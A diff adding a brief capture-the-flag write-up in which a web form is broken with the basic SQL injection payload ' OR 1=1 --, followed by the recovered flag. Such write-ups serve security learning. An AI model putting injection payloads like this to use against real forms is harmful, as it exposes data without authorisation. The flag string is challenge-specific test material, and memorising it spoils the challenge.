@@ -1,0 +1,8 @@
+Immediately, it seems like the form is vulnerable to sql injection.
+Trying the most basic query
+
+    ' OR 1=1 --
+
+leaks the flag.
+
+flag{sql_Ij3cti0n_4_th3_w1n@!!!!}
